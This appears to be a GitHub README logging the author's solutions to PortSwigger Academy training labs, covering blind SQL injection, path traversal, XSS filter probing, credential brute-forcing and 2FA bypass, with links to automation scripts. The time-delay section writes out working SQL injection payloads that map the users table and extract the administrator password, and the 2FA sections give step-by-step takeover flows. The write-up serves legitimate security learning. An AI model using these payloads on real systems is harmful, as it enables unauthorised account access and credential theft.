# PortSwigger Academy

This repository serves as a live progress tracker.

##

## Academy Progress Metrics

<img width="745" height="237" alt="image" src="https://github.com/user-attachments/assets/6131a1d8-9484-47fc-b9eb-948779b253c8" />

##

## Lab automation

**Lab: Blind SQL injection with conditional responses**

Because manual brute-forcing of a 20-character password would be miserable, I initially tried using the "Intruder" tool in Burp Suite. However, since I am using the Community Edition, the execution is artificially rate-limited and takes way too long. To bypass this performance ceiling, I decided to build my own custom automation script in Python.

Prerequisites to extract from the HTTP requests (e.g., using Burp Suite):
1. **Target URL** with a category filter: 'web-security-academy.net/filter?category=Gifts'
2. **TrackingId** cookie value from GET request: 'WRZcL3blKj8g33lD'
3. **Session** cookie value from GET request: 'nL2y3jQS7RGGszFBzSetHZfPfGPrOgOq'

By copying these 3 elements into the Python script, it dynamically treats the application response as a "Boolean Oracle" (checking for the "Welcome back" string) to exfiltrate the full administrator password character-by-character.

The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-blind_sqli_oracle.py

##

**Lab: Blind SQL injection with time delays**

In this laboratory, the initial objective was to cause a 10 second delay using SQL injection with time delays with in cookies. I curious if environment give me acces to log in to website.
1. Triggered time delay:
   
   "'pg_sleep(10)--"

2. Verified that the application could process 'case when' expressions:

   "'||(select case when(1=1) then pg_sleep(3) else pg_sleep(0) end)--"

5. Verified existence of the target table 'users':

   "'||(select case when exists(select 1 from information_schema.tables where table_name='users') then pg_sleep(3) else pg_sleep(0) end)--"

6. Verified existence of the target columns 'username' and 'password':

   "'||(select case when exists(select 1 from information_schema.columns where table_name='users' and column_name='username') then pg_sleep(3) else pg_sleep(0) end)--"

   "'||(select case when exists(select 1 from information_schema.columns where table_name='users' and column_name='password') then pg_sleep(3) else pg_sleep(0) end)--"

7. Verified existence of the administrator user:

   "||(select case when exists(select username from users where username = 'administrator') then pg_sleep(3) else pg_sleep(0) end)--"

8. Verified password length by Intruder in Burp:

   "'||(select case when exists(select password from users where username='administrator' and length(password)=§20§) then pg_sleep(2) else pg_sleep(0) end)--"

Payload type -> Numbers from 1 to 50 step by 1.

9. Since the free Burp applies severe rate-limiting I solved this problem by develop my own script in Python. The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-blind_sqli_with_with_time_delays.py

By executing my own script i successful login as the administrator user.

##

**Lab: File path traversal, simple case**

The objective of this lab was to retrieve the contents of the '/etc/passwd' file. After completing the lab manually, I developed a simple Python script to automate file enumeration through the vulnerable endpoint. Instead of requesting individual files one by one, the script iterates over a custom wordlist, builds the appropriate path traversal payloads, sends HTTP requests, and displays the contents of files that are successfully retrieved.

For this exercise, the wordlist contains only two common Linux files: 'etc/passwd', 'etc/hostname'.

The script can easily be extended with additional file paths to automate further testing during similar path traversal exercises.

The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-file_path_traversal_simple_case.py

##

**Lab: Reflected XSS into HTML context with most tags and attributes blocked**

In this lab, I tested reflected XSS in the search functionality protected by a Web Application Firewall (WAF) against common XSS payloads. The manual testing phase using Burp Community was very time consuming because I need to do two separate wordlist with 143 and 144 entries. To automate this process, I developed a custom Python script that sends payloads automatically and identifies which tags and attributes are accepted by the application.

The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-reflected_xss_with_blocked_tags_and_attributes.py

##

**Lab: Username enumeration via different responses**

In this lab, I needed to brute-force a username and password to gain access to an account. PortSwigger provides a wordlist containing 101 usernames and 100 passwords. My first idea was to use Burp Suite Community Edition with a Cluster bomb attack. However, after seeing 10100 iterations that the attack would require, I realized it would take far too long due to the Community Edition's payload rate limiting. I decided to do my own script in Python with the same plan and the 10100 iteration. Then I realized I could first try to find the username and then try to find out which password is correct for this username. This reduced the maximum number of requests from 10100 to approximately 201, assuming a single valid username. After solving the lab with my script, I also completed it manually in Burp Suite using two Sniper attacks: the first to enumerate the valid username and the second to brute-force its password.

The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-username_enumeration_via_diffrent_responses.py

##

**Lab: 2FA broken logic**

This lab required gaining access to Carlos's account by exploiting a flaw in the two-factor authentication process. The vulnerability was caused by improper trust of the user-controlled parameter ('verify'). The application allowed changing the target username during the MFA verification process, which made it possible to generate and use an MFA code for another user. I noticed that the application accepted a different value of the 'verify' parameter than the one used in the login form. This allowed the application to generate an MFA code for victim (carlos) account. The next step was brute-force the four-digit MFA code. I decided to do my own script in Python because Burp in community version would be too slow. I also decided to improve performance by using threads. The script generates all possible four-digit MFA codes, sends concurrent HTTP requests and check the response status code to detect successful authentication. In this vulnerability exploit flow is probably most important and it looks like this:

- modify the MFA generation request by changing the 'verify' parameter from our 'wiener' to 'carlos', this generate MFA code for victim;

- run our script

- submit the discovered MFA code and also change 'verify' parameter;

- use the new session cookie returned after successful MFA verification to access victim's account page.

The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-2FA_broken_logic.py

##

**2FA bypass using a brute-force attack**

This lab was tricky because the hardest part was understanding how the application works. Once I uderstood the authentication flow, writing my own script was actually the fun part.

The main challenge was handling the CSRF token and session cookie. I had to capture them from one step and carry them the next step of the authentication process.

Another thing that was easy to spot but more difficult to implement in the script was the second MFA attempt. After incorrect code, I could try the next code in the same phase witout another login process.

There was another interesting thing. We don't have separate test account, so I could not easily verify what happens after submiting the correct MFA code. Everything after the successful MFA verification was effectively a black box. I had to investigate a 302 status code and that the authenticated account page is located ad /my-account.

This was also important for the automation. Initially, checking whether "Incorrect security code" was present in the response seemed like an easy way to detect a failed attempt. However, this was not reliable enough, especially when running multiple threads. I therefore changed the detection logic to rely on the HTTP status code instead.

Finally, I improved the script by using multithreading. The four-digit MFA code gives 10000 possible combinations, so I split the work between multiple workers.

The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-2FA_bypass_using_a_brute-force_attack_using_threading.py

##

